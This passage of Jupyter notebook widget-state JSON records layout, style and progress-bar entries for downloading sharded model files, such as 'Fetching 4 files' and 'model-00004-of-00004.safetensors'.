            "value": " 754/754 [00:00&lt;00:00, 90.3kB/s]"
          }
        },
        "9217447508564f11afe2efefa257165b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2f95561ae8ae463dbb96dd06c54617b9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "12fa676fc3ef43a79fc8dea37326d17a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "5d823dda82354ba8aa58cc59c4768dc8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5381a8da72b94bb2a1523525805ce8bc": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "4c0920207d3d42f4a8fd8e1fe3e50f13": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5d06c490324e4412a98a35ef0f59e6ca": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "eb34f767d0824c479b28872d03687ad5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_aeda9f2d2a8a4937b02d08fabaef0698",
              "IPY_MODEL_b5fd71b699d348498197bf682cfa4818",
              "IPY_MODEL_ec97ff2cd2074d87bc7e263c6e750f57"
            ],
            "layout": "IPY_MODEL_c5d4e576a22640dc9f57e6306a174e2c"
          }
        },
        "aeda9f2d2a8a4937b02d08fabaef0698": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c72ddf5f9715468ba80a7a631decc215",
            "placeholder": "​",
            "style": "IPY_MODEL_69dfcaf176a1433bb5687029e5813869",
            "value": "model.safetensors.index.json: "
          }
        },
        "b5fd71b699d348498197bf682cfa4818": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9eba94c2e05c491aa550d410ba21e937",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_ec352e512e8b49af872753719f0de91f",
            "value": 1
          }
        },
        "ec97ff2cd2074d87bc7e263c6e750f57": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_34b324f718fc4f7089e8e35c7bf098a4",
            "placeholder": "​",
            "style": "IPY_MODEL_b5f3f5b25f974fd680bc2c831e62a25f",
            "value": " 32.9k/? [00:00&lt;00:00, 3.59MB/s]"
          }
        },
        "c5d4e576a22640dc9f57e6306a174e2c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c72ddf5f9715468ba80a7a631decc215": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "69dfcaf176a1433bb5687029e5813869": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9eba94c2e05c491aa550d410ba21e937": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "ec352e512e8b49af872753719f0de91f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "34b324f718fc4f7089e8e35c7bf098a4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b5f3f5b25f974fd680bc2c831e62a25f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "2c128947c72b44e8a70f0c9e917c69f0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_2eaccbc3e73240cc8c8830e8a49c6b13",
              "IPY_MODEL_64ea50da792642d987b42d1308af5eea",
              "IPY_MODEL_7bfb644fef0f4a538fd24a28650f4006"
            ],
            "layout": "IPY_MODEL_2162203764224a4fa35624e2916b871d"
          }
        },
        "2eaccbc3e73240cc8c8830e8a49c6b13": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_988908c02860422485c3af35eecd6aff",
            "placeholder": "​",
            "style": "IPY_MODEL_60cb7d6e623a4589b9f239a895d1300b",
            "value": "Fetching 4 files: 100%"
          }
        },
        "64ea50da792642d987b42d1308af5eea": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_863eacba8381449abb879f0dd62f8922",
            "max": 4,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_848f0d504550430cb6f9bef3a5e8fd22",
            "value": 4
          }
        },
        "7bfb644fef0f4a538fd24a28650f4006": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8461d52907644573bc3ea6b101b496e1",
            "placeholder": "​",
            "style": "IPY_MODEL_248fbc260ce544daba814d94f72cb37b",
            "value": " 4/4 [11:20&lt;00:00, 176.70s/it]"
          }
        },
        "2162203764224a4fa35624e2916b871d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "988908c02860422485c3af35eecd6aff": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "60cb7d6e623a4589b9f239a895d1300b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "863eacba8381449abb879f0dd62f8922": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "848f0d504550430cb6f9bef3a5e8fd22": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "8461d52907644573bc3ea6b101b496e1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "248fbc260ce544daba814d94f72cb37b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "b49d28ff61ae4932a41943c460172f22": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_f1b33cc212e84ad7842bdaec83a3109d",
              "IPY_MODEL_ba6d074cf985487c92992885d2de1908",
              "IPY_MODEL_418db6c722564a5cad1cba85b485073e"
            ],
            "layout": "IPY_MODEL_4c51ec3ca8124e4282839642ff06adab"
          }
        },
        "f1b33cc212e84ad7842bdaec83a3109d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c4d3cbf119b44483a7d47c95eb30f87e",
            "placeholder": "​",
            "style": "IPY_MODEL_9ea24533e7534e5590f624eebe0e1f82",
            "value": "model-00004-of-00004.safetensors: 100%"
          }
        },
        "ba6d074cf985487c92992885d2de1908": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_400b556973e149bdb10fa90cfdb9b12a",
            "max": 1580230264,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_ecaa8b7ff0504a79be4ec1832f78c2d9",
            "value": 1580230264
          }
        },
        "418db6c722564a5cad1cba85b485073e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_34a92a4cf794416ab5501e16966a9488",
            "placeholder": "​",
            "style": "IPY_MODEL_a074f26fcb9b40b49ca8d043df979a7d",
            "value": " 1.58G/1.58G [05:58&lt;00:00, 2.66MB/s]"
          }
        },
        "4c51ec3ca8124e4282839642ff06adab": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c4d3cbf119b44483a7d47c95eb30f87e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9ea24533e7534e5590f624eebe0e1f82": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "400b556973e149bdb10fa90cfdb9b12a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
